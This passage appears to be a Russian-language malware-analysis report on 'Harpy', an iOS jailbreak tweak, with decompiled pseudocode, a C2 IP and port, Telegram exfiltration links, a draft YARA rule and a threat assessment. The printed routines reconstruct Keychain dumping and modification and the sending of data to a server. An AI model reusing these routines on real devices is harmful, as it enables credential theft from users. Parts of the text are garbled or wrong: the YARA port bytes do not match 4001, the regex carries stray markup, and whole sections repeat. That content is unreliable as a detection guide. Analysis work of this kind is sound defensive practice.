    NSString *path = Harpy_getScriptDirectory().path;
    
    NSArray *files = [fm contentsOfDirectoryAtPath:path error:nil];
    NSMutableArray *txtFiles = [NSMutableArray array];
    
    for (NSString *file in files) {
        // Проверка расширения: 0x7478742E = ".txt"
        if ([file hasSuffix:@".txt"]) {
            [txtFiles addObject:file];
        }
    }
    
    // Обновление State.wrappedValue с отфильтрованным списком
    State.wrappedValue.setter(txtFiles);
}
```

### Harpy_writeFileToPath (0x4877C) — Запись файла

```c
// Адрес: 0x4877C
// Записывает данные в указанный путь
void Harpy_writeFileToPath(NSURL *baseURL, String filename, String content) {
    // Добавление имени файла к пути
    NSURL *fileURL = URL.appendingPathComponent(filename);
    
    // Кодировка UTF-8
    NSStringEncoding encoding = static String.Encoding.utf8.getter();
    
    // Запись файла
    StringProtocol.write(to:atomically:encoding:)(
        content, fileURL, YES, encoding);
}
```

---

## 🔐 Работа с Keychain

### Harpy_updateKeychainValue (0x469AC) — Обновление ключа

```c
// Адрес: 0x469AC
// Обновляет значение в Keychain
void Harpy_updateKeychainValue(String key, String value) {
    // 1. Формирование query словаря
    NSDictionary *query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrAccount: key
    };
    
    // 2. Конвертация значения в Data (UTF-8)
    NSData *valueData = [value dataUsingEncoding:NSUTF8StringEncoding];
    
    // 3. Формирование attributes для обновления
    NSDictionary *attributes = @{
        (__bridge id)kSecValueData: valueData
    };
    
    // 4. Обновление через SecItemUpdate
    OSStatus status = SecItemUpdate(
        (__bridge CFDictionaryRef)query,
        (__bridge CFDictionaryRef)attributes);
}
```

### Harpy_readKeychainEntry (0x4A0A0) — Чтение записи

```c
// Адрес: 0x4A0A0
// Читает запись из Keychain и форматирует результат
String Harpy_readKeychainEntry(Dictionary keychainData) {
    // Извлечение kSecAttrAccount и kSecValueData
    String account = keychainData[kSecAttrAccount];
    Data valueData = keychainData[kSecValueData];
    
    // Декодирование Data в String (UTF-8)
    String value = String(data: valueData, encoding: .utf8) ?? "unknown";
    
    // Формирование строки результата: "account: value"
    // 0x203A = ": "
    return account + ": " + value;
}
```

---

## 🌐 HTTP-запросы

### Harpy_sendHTTPRequest (0x47FD8) — POST запрос

```c
// Адрес: 0x47FD8
// Отправляет POST запрос с JSON телом
void Harpy_sendHTTPRequest(String urlString, Dictionary payload) {
    // 1. Создание URL
    URL url = URL.init(string: urlString);
    
    // 2. Создание URLRequest
    URLRequest request = URLRequest.init(
        url: url, 
        cachePolicy: 0, 
        timeoutInterval: 60.0);
    
    // 3. Установка метода POST (0x54534F50 = "POST")
    request.httpMethod = "POST";
    
    // 4. Заголовок Content-Type
    // 0x2D746E65746E6F43 = "Conten-t"
    // 0xEC00000065707954 = "Type"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type");
    
    // 5. Сериализация JSON
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload 
                                           options:0 
                                           error:nil];
    request.httpBody = jsonData;
    
    // 6. Создание задачи через sharedSession
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request 
                                          completionHandler:^(NSData *data, 
                                                             NSURLResponse *response, 
                                                             NSError *error) {
        // Обработка ответа
    }];
    
    // 7. Запуск задачи
    [task resume];
}
```

---

## 📦 Импорты и зависимости

### Swift Runtime

| Символ | Назначение |
|--------|------------|
| `swift_allocObject` | Аллокация объектов |
| `swift_release` / `swift_retain` | ARC управление |
| `swift_bridgeObjectRetain` | Bridge object retain |
| `swift_getObjCClassMetadata` | ObjC interop |
| `swift_getOpaqueTypeConformance` | Protocol conformance |
| `swift_once` | Thread-safe initialization |
| `swift_unexpectedError` | Error handling |

### Foundation

| Символ | Назначение |
|--------|------------|
| `NSUserDefaults` | Хранение настроек |
| `NSFileManager` | Работа с файлами |
| `NSRegularExpression` | Парсинг regex |
| `NSPredicate` | CoreData запросы |
| `NSData` | Бинарные данные |

### Security.framework

| Символ | Назначение |
|--------|------------|
| `SecItemDelete` | Удаление из Keychain |
| `SecItemCopyMatching` | Чтение Keychain |
| `SecItemUpdate` | Обновление Keychain |

### Network.framework

| Символ | Назначение |
|--------|------------|
| `NWConnection` | TCP соединение |
| `NWEndpoint` | Endpoint (host:port) |
| `NWParameters` | Параметры соединения |

### SwiftUI

| Символ | Назначение |
|--------|------------|
| `State.wrappedValue` | Property wrapper |
| `EnvironmentObject` | DI контейнер |
| `NavigationView` | Навигация |
| `Button` | Кнопки |
| `Image` | Изображения |

---

## 📝 Ключевые строки и константы

### DSL команды

```
.harpy.edit.userdefaults      (0x50990)
.harpy.remove.userdefaults    (0x509b0)
.harpy.clear.userdefaults     (0x509d0)
.harpy.read.userdefaults      (0x509f0)
.harpy.edit.keychain          (0x50a10)
.harpy.remove.keychain        (0x50a30)
.harpy.read.keychain          (0x50a50)
.harpy.update.coredata        (0x50a70)
.harpy.update.server          (0x50a90)
.harpy.write.file             (0x50ab0)
.harpy.print(message:         (0x50ad0)
.harpy.execute(script:        (0x50af0)
```

### Regex паттерны

```
\.harpy\.remove\.keychain\$begin:math:text\$"([^"]+)"\$end:math:text\$  (0x50bc0)
sleep:(\+\d\)                 (парсинг задержки)
```

### Сообщения

```
"Keychain ключ удален: "      (0x50c10)
"Keychain обновлен: "         (0x50c40)
"Нет записей в Keychain"      (0x50d40)
"Выполняется повтор..."       (0x50513)
"For Developers"              (текст секции)
"HarpyTeam"                   (подпись)
```

### URLs

```
https://i.ibb.co/SKYxFp1/logos.png     (0x50700)
https://t.me/harpyapp_bot
https://t.me/harpysupport
https://t.me/harpyapp
https://t.me/lurizevl
https://t.me/imharpy
```

### Файлы

```
harpyconfig.txt               (файл конфигурации)
harpy.dylib                   (путь установки)
.txt                          (фильтр скриптов)
```

---

## 🚨 Индикаторы компрометации (IoC)

### Network IoC

| Тип | Значение | Описание |
|-----|----------|----------|
| **IP** | `92.246.138.114` | C2 сервер (TCP) |
| **Port** | `4001/tcp` | C2 порт (NWConnection) |

### Telegram IoC

| URL | Описание |
|-----|----------|
| `https://t.me/harpyapp_bot` | Telegram бот для эксфильтрации |
| `https://t.me/harpysupport` | Канал поддержки |
| `https://t.me/harpyapp` | Основной канал |
| `https://t.me/imharpy` | Канал разработчика |
| `https://t.me/lurizevl` | Канал разработчика |

### Image Hosting IoC

| URL | Описание |
|-----|----------|
| `https://i.ibb.co/SKYxFp1/logos.png` | Логотип (2 xrefs) |
| `https://i.ibb.co/BwMHWm4/Group-254.png` | UI asset |
| `https://i.ibb.co/KWbdS7b/Group-258.png` | UI asset |
| `https://i.ibb.co/h8DLvFG/Group-257.png` | UI asset |
| `https://i.ibb.co/m4wbRrK/Group-251.png` | UI asset |

### File IoC

| Путь | Описание |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | Основной модуль |
| `Documents/harpyconfig.txt` | Файл конфигурации |
| `Documents/harpyscript/` | Директория скриптов |

### Behavioral IoC

- Проверка `NSProcessInfo.isLowPowerModeEnabled` каждые 60 сек (триггер инъекции)
- Обращение к `NSUserDefaults.standardUserDefaults.dictionaryRepresentation`
- Вызовы `SecItemCopyMatching` с `kSecMatchLimitAll` (dump всего Keychain)
- Вызовы `SecItemDelete`, `SecItemUpdate` (модификация Keychain)
- TCP соединение на порт 4001 через Network.framework
- Загрузка изображений с `ibb.co`
- Regex парсинг с паттернами `.harpy.*`
- JSON payload с полями: `telegramId`, `data`, `action`

### YARA Rule (Draft)

```yara
rule Harpy_iOS_Tweak {
    meta:
        description = "Harpy iOS jailbreak tweak"
        author = "Reverse Engineer"
        
    strings:
        $c2_ip = "92.246.138.114"
        $c2_port = { 01 10 00 00 }  // 4001 little-endian
        $cmd1 = ".harpy.edit.userdefaults"
        $cmd2 = ".harpy.remove.keychain"
        $cmd3 = ".harpy.update.coredata"
        $telegram = "harpyapp_bot"
        $logo_url = "i.ibb.co/SKYxFp1"
        
    condition:
        (uint32(0) == 0xFEEDFACF) and  // Mach-O 64-bit
        ($c2_ip or $telegram) and
        2 of ($cmd*)
}
```

---

## 📊 Заключение

**Harpy** представляет собой сложный iOS jailbreak-твик с:

1. **Полноценным скриптовым DSL** для модификации приложений
2. **C2 инфраструктурой** для удалённого управления
3. **Телеметрией через Telegram** для сбора данных
4. **SwiftUI интерфейсом** для удобного управления

### Уровень угрозы: 🔴 ВЫСОКИЙ

- Прямой доступ к Keychain
- Модификация UserDefaults любого приложения  
- Возможность удалённого управления
- Экфильтрация данных через Telegram

---

*Отчёт создан в результате полного реверс-инжиниринга с использованием IDA Pro + MCP*

### ⚠️ Потенциальные риски

1. **Data exfiltration** — Данные отправляются на C2-сервер (92.246.138.114:4001) и Telegram
2. **Keychain manipulation** — Прямой доступ к Keychain через Security.framework
3. **Persistence** — Сохранение конфигурации в файловую систему
4. **No encryption** — Скрипты хранятся в открытом виде
5. **Remote command execution** — Возможность выполнения удалённых скриптов
6. **UserDefaults tampering** — Модификация настроек любого приложения

---

### 🛡️ Indicators of Compromise (IOC)

#### Сетевые индикаторы:
| Тип | Значение |
|-----|----------|
| **IP** | `92.246.138.114` |
| **Port** | `4001/tcp` |
| **Domain** | `t.me/harpyapp_bot` |

#### Файловые индикаторы:
| Путь | Описание |
|------|----------|
| `/Library/MobileSubstrate/DynamicLibraries/harpy.dylib` | Основной бинарник |
| `Documents/harpyconfig.txt` | Конфигурация скриптов |

#### Строки:
```
"Data logging in telegram bot"
".harpy.edit.userdefaults"
".harpy.remove.keychain"
"harpyapp_bot"
"Keychain ключ удален"
```

---

### 📊 Статистика

- **Функций**: ~900+
- **Импортов**: 300+ (Foundation, UIKit, SwiftUI, Security, CoreData, Network)
- **Строк**: 500+ (включая Swift metadata)
- **Сегментов**: 35 (стандартная Mach-O структура)

---

### 📦 Используемые Frameworks

| Framework | Назначение |
|-----------|------------|
| **Foundation** | NSUserDefaults, NSFileManager, NSData, JSONDecoder |
| **UIKit** | UIImage, UIWindow |
| **SwiftUI** | Полный UI (Button, Text, NavigationLink, State, Binding) |
| **Security** | SecItemCopyMatching, SecItemDelete, SecItemUpdate (Keychain) |
| **CoreData** | NSManagedObjectContext, NSPredicate, NSFetchRequest |
| **Network** | NWConnection, NWEndpoint (TCP к C2-серверу) |
| **Combine** | Published, ObservableObject, StateObject |
| **CydiaSubstrate** | MSHookMessageEx, MSHookFunction (runtime hooking) |

---

### 🔬 Методология анализа

1. **IDA Pro 8.x** — статический анализ ARM64e Mach-O
2. **Hex-Rays Decompiler** — декомпиляция в псевдокод Swift/ObjC
3. **Swift Demangler** — разбор Swift symbol names
4. **Строковой анализ** — поиск URL, IP, путей, команд
5. **Cross-reference анализ** — построение call graph

---

## 🏷️ Полный список переименованных функций

### UI Functions (3)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x288DC` | `HarpyUI_buildTextPair` | 0x5ac | Создание пары текстовых View |
| `0x290E0` | `HarpyUI_buildTelegramButton` | 0x82c | Создание кнопки ссылки на Telegram |
| `0x2990C` | `HarpyUI_buildInfoCard` | 0x9e0 | Создание информационной карточки |

### Network Functions (5)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x2A2EC` | `HarpyNetwork_connectToServer` | 0x330 | TCP соединение к 92.246.138.114:4001 |
| `0x2AA6C` | `HarpyNetwork_onStateChange` | 0x3d4 | Обработчик изменения состояния NWConnection |
| `0x2AE40` | `HarpyNetwork_onConnectionReady` | 0x8cc | Отправка JSON payload при подключении |
| `0x2B710` | `HarpyNetwork_sendComplete` | 0x454 | Callback завершения отправки |
| `0x2BB6C` | `HarpyNetwork_receiveData` | 0x88c | Приём и парсинг JSON ответа |

### Script Engine Functions (4)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x42B54` | `HarpyScript_executeCommands` | 0x2918 | Главный парсер DSL (1883 строки) |
| `0x48464` | `Harpy_parseScriptCommand` | 0x318 | Парсинг отдельной команды |
| `0x490C8` | `Harpy_executeScript` | 0x460 | Выполнение скрипта из файла |
| `0x4AA48` | `Harpy_createRegex` | 0xdc | Создание NSRegularExpression |

### Data Management Functions (11)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x46654` | `Harpy_readUserDefaults` | 0x33c | Чтение всех UserDefaults |
| `0x469AC` | `Harpy_updateKeychainValue` | 0x2e8 | Обновление значения в Keychain |
| `0x46C94` | `Harpy_editKeychain` | 0x12c | Редактирование записи Keychain |
| `0x46DC0` | `Harpy_readKeychain` | 0x370 | Чтение всех записей Keychain |
| `0x47130` | `Harpy_updateCoreData` | 0x404 | Обновление сущности CoreData |
| `0x47534` | `Harpy_updateCoreDataBatch` | 0x7c8 | Пакетное обновление CoreData |
| `0x47CFC` | `Harpy_writeFile` | 0x2dc | Запись данных в файл |
| `0x47FD8` | `Harpy_sendHTTPRequest` | 0x470 | HTTP POST запрос |
| `0x4877C` | `Harpy_writeFileToPath` | 0x490 | Запись файла по указанному пути |
| `0x49528` | `Harpy_saveScriptConfig` | 0x59c | Сохранение в harpyconfig.txt |
| `0x4A0A0` | `Harpy_readKeychainEntry` | 0x2e4 | Чтение одной записи Keychain |

### File System Functions (1)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x49AC4` | `Harpy_ensureScriptDirectory` | 0x5dc | Создание Documents/harpyscript |

### Logger Functions (1)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x2DC1C` | `HarpyLogger_wrapCallback` | 0xb0 | Wrapper для callback логгера |

### Injection & Lifecycle Functions (6)
| Адрес | Имя | Размер | Описание |
|-------|-----|--------|----------|
| `0x35C00` | `UserData_init` | 0x1f8 | Инициализатор UserData класса |
| `0x3BEE0` | `AppState_onStartPressed` | 0x3f8 | Обработчик нажатия Start |
| `0xBD14` | `SwiftUIWrapper_setupTimer` | 0x138 | NSTimer каждые 60 сек |
| `0xBF1C` | `SwiftUIWrapper_startMonitoring` | 0x28 | Точка входа мониторинга |
| `0xC280` | `SwiftUIWrapper_dismissUI` | 0x2d8 | Скрытие Harpy UI |
| `0xE5F0` | `SwiftUIWrapper_injectHarpyUI` | 0xa24 | Инъекция UI в целевое приложение |

**Итого: 31 переименованная функция**

---

### 📝 Заключение

**harpy_fixed_v3.dylib** — это продвинутый iOS jailbreak tweak с:
- Полноценным C2-каналом для удалённого управления
- Telegram-ботом для эксфильтрации данных  
- Собственным DSL для автоматизации атак
- Доступом к чувствительным хранилищам (Keychain, CoreData)

Представляет серьёзную угрозу для приватности и безопасности пользователей jailbroken устройств.

---

*Анализ выполнен: Декабрь 2025*
